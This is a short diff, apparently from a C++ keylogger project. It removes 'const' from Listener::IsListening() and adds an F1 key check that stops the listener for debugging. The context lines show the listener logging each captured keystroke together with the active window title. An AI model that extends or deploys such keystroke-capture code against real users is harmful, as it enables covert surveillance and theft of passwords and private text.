@@ -22,7 +22,7 @@ void Listener::Stop()
 }
 
 // IsListening() : Return Listener status (Listening attribut)
-bool Listener::IsListening() const
+bool Listener::IsListening()
 {
 	return Listening;
 }
@@ -55,6 +55,13 @@ void Listener::Run()
 					Log->Add(Utilities::GetActiveWindow(), key);
 					last_key = key;
 					this->Timer.restart();
+				}
+
+				// Press F1 to quit program for debug purpose
+				if (key == VK_F1)
+				{
+					this->Stop();
+					break;
 				}
 			}
 		}
